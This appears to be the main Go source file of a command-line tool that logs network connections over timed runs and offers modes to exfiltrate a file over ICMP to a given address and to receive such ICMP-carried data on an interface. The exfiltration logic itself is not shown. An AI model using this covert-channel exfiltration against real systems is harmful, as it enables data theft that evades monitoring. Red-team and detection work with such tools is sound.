package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"time"
)

const (
	DeadBeef = 0xdeadbeef
)

func main() {
	fileNamePtr := flag.String("f", "", "Specify the file name for 'read' mode")
	numRunsPtr := flag.Int("t", 0, "Specify the number of runs for 'execution' mode")
	intervalMultiplierPtr := flag.Int("m", 0, "Specify the minutes multiplier for 'execution' mode")
	ICMPExfilFileNamePtr := flag.String("eif", "", "Specify the file name for 'ICMP exfiltration' mode")
	exfilAddr := flag.String("ea", "", "Specify the address for 'ICMP exfiltration' mode")
	exfilICMPiface := flag.String("eii", "", "Specify the interface for 'ICMP exfiltration' mode")

	flag.Parse()

	if *fileNamePtr != "" {
		displayFile(*fileNamePtr)
	} else if *numRunsPtr > 0 && *intervalMultiplierPtr > 0 {
		runProgram(*numRunsPtr, *intervalMultiplierPtr)
	} else if *ICMPExfilFileNamePtr != "" && *exfilAddr != "" {
		ICMPExfil := NewICMPExfil(*ICMPExfilFileNamePtr, *exfilAddr)
		err := ICMPExfil.Exfiltrate()
		if err != nil {
			log.Fatalf("error on exfiltration: %v", err)
		}
	} else if *exfilICMPiface != "" {
		receiver := NewICMPReceiver(*exfilICMPiface)
		receiver.Start()
	} else {
		fmt.Printf("Usage of %s:\n", os.Args[0])
		fmt.Println()
		fmt.Println("Mode 1: Read Mode (-f)")
		fmt.Println("  Use '-f' followed by a file name to display data from a binary file.")
		fmt.Printf("  Example: ./%s -f data.bin\n", os.Args[0])
		fmt.Println()
		fmt.Println("Mode 2: Execution Mode (-t and -m)")
		fmt.Println("  Use '-t' followed by the number of runs and '-m' followed by the minutes multiplier to collect data over multiple runs.")
		fmt.Printf("  Example: ./%s -t 5 -m 10\n", os.Args[0])
		fmt.Println()
		fmt.Println("Mode 3: ICMP Exfiltration (-eif and -ea)")
		fmt.Println("  Use '-eif' followed by the file name and '-ea' followed by the address for ICMP exfiltration.")
		fmt.Printf("  Example: ./%s -eif data.txt -ea 192.168.1.1\n", os.Args[0])
		fmt.Println()
		fmt.Println("Mode 4: Receive ICMP (-eii)")
		fmt.Println("  Use '-eii' followed by the interface name for ICMP reception.")
		fmt.Printf("  Example: ./%s -eii eth0\n", os.Args[0])
		flag.PrintDefaults()
	}
}

// runProgram runs the data collection program for the specified number of runs with a given interval.
func runProgram(numRuns int, intervalMultiplier int) {
	interval := time.Duration(intervalMultiplier) * time.Minute

	connections := NewConnections()
	collector := NewCollector()

	for i := 0; i < numRuns; i++ {
		connections.GetConnections()
		for _, info := range connections.GetConnections() {
			collector.AddConnectionInfo(info)
		}
		collector.Print()
		binaryData, err := collector.EncodeToBinary()
		if err != nil {
			log.Fatalf("error on saving: %v", err)
		}
		SaveToBinaryFile(binaryData, "data.bin")
		if i < numRuns-1 {
			time.Sleep(interval)
		}
	}
}

// displayFile reads and displays data from a binary file.
func displayFile(fileName string) {
	data, err := ReadFromBinaryFile(fileName)
	if err != nil {
		log.Fatalf("Error during file reading: %v", err)
	}
	collector, err := DecodeCollectorFromBinary(data)
	if err != nil {
		log.Fatalf("Error during gob decoding: %v", err)
	}
	collector.Print()
}
